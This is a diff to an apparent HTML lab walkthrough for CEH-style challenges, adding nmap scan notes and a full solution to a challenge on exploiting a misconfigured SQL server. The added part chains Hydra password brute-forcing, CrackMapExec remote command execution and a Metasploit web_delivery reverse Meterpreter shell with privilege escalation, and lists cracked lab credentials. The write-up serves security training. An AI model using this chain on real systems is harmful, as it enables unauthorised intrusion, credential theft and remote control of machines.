@@ -65,10 +65,14 @@ Your task is to analyze this report and identify the hostname associated with th
 <p><ol>
 <ul>nmap -sV -O 192.168.0.222</ul>
 <ul>NetBIOS_Domain_Name is SKILL.CEH</ul>
+<ul>It is also possible to use the -A parameter:</ul>
+<ul>nmap -A 192.168.0.222</ul>
 </ol></p>
 <p>Challenge 6:</p>
-<p>Perform an intense scan on 192.168.0.222 and find out the DNS_Tree_Name of the machine in the network. (Format: AAAAA.AAA.aaa)</p>
+<p>Perform an <b>intense scan</b> on 192.168.0.222 and find out the DNS_Tree_Name of the machine in the network. (Format: AAAAA.AAA.aaa)</p>
 <p><ol>
+<ul>Remeber: an intense scan uses the -A parameter</ul>
+<ul>nmap -A 192.168.0.222</ul>
 <ul>DNS_Tree_Name is SKILL.CEH.com</ul>
 </ol></p>
 <p>Challenge 7:</p>
@@ -83,8 +87,8 @@ Note: Target network 172.30.10.0/24 (Format: Aaaaaa)</p>
 <p><ol>
 <ul>nmap -sV -p 3306 172.30.10.0/24</ul>
 <ul>172.30.10.99 has open port 3306</ul>
-<ul>nmap -O -T4 172.30.10.99</ul>
-<ul>Running: Linux</ul>
+<ul>nmap -A 172.30.10.99</ul>
+<ul>Running: Ubuntu</ul>
 </ol></p>
 <p>Challenge 9:</p>
 <p>Perform an intense scan on target subnet 192.168.10.0/24 and determine the IP address of the machine hosting the MSSQL database service. 
@@ -246,10 +250,42 @@ docker run -d -p 443:443 --name openvas mikesplain/openvas</p>
         <ul>john wordlist=/home/attacker/rockyou.txt /home/attacker/asrephash.txt</ul>
         <ul>The password of user Joshua is <b>c3ll0@123</b></ul>
     </ol></p>
+<p>Challenge 8:</p>
+    <p>A client machine under the target domain controller has a misconfigured SQL server vulnerability. Your task is to exploit this vulnerability, 
+        retrieve the MSS.txt file located in the Public Downloads folder on the client machine and determine its size in bytes as answer. 
+        Note: use users.txt and rockyou.txt files stored in attacker home directory while cracking the credentials. (Format: N)</p>
+    <p>At first, this was not so easy to find out, but by reading the information in the challenge it is clear that we have to use Metasploit to get a 
+        meterpreter on the target and retrieve the flag. Also, we need Hydra and CrackMapExec for post-exploitation. 
+        There's always <a target=_blank href=https://attackdefense.com/challengedetailsnoauth?cid=2321>on-line information</a>.</p> 
+    <p><ol>
+        <ul>nmap -A -p1433 192.168.10.144</ul>
+        <ul>Domain: SKILL.CEH; NETBIOS_Computer_Name: SQL_SRV</ul>
+        <ul>hydra -L /home/attacker/users.txt -P /home/attacker/rockyou.txt 192.168.10.144 mssql</ul>
+        <ul>Account <b>Server_mssrv</b> has password <b>Spidy</b></ul>
+        <ul>With these credentials we can get access to the filesystem of the remote system using the <b>local-auth</b> parameter</ul>
+        <ul>crackmapexec mssql 192.168.10.144 -u Server_mssrv -p Spidy --local-auth -x "whoami"</ul>
+        <ul>Now we have tested that we can run commands on the remote system, it's time to start Metasploit in a separate terminal</ul>
+        <ul>msfconsole</ul>
+        <ul>use exploit/multi/script/web_delivery</ul>
+        <ul>set SRVHOST [IP address of this machine, use ifconfig to check!]</ul>
+        <ul>set SRVPORT 8443</ul>
+        <ul>set target 2</ul>
+        <ul>set payload windows/meterpreter/reverse_https</ul>
+        <ul>set LHOST [IP address of this machine]</ul>
+        <ul>set LPORT 443</ul>
+        <ul>run -j</ul>
+        <ul>Once run, the web_delivery module will spin up the webserver to host the script and reverse listener for our meterpreter session</ul>
+        <ul>Copy the last element of 'USING URL:' shown in Metasploit</ul>
+        <ul>In the first console: crackmapexec mssql 192.168.10.144 -u Server_mssrv -p Spidy --local-auth -M met_inject -o SRVHOST=[IP address of this machine] SRVPORT=8443 RAND=[last element of URL shown in Metasploit] SSL=http</ul>
+    <ul>If everything went well a session opens in Metasploit</ul>
+        <ul>sessions 1</ul>
+        <ul>getsystem</ul>
+        <ul>shell</ul>
+        <ul>Once you have a shell you can go to C:\Users\Public\Downloads and find the answer to the challenge</ul>
+        <ul>The file MSS.txt is 7 bytes !</ul>
+    </ol></p>
 
-Challenge 8:
-
-A client machine under the target domain controller has a misconfigured SQL server vulnerability. Your task is to exploit this vulnerability, retrieve the MSS.txt file located in the Public Downloads folder on the client machine and determine its size in bytes as answer. Note: use users.txt and rockyou.txt files stored in attacker home directory while cracking the credentials. (Format: N)
+    
 
 Challenge 9:
 
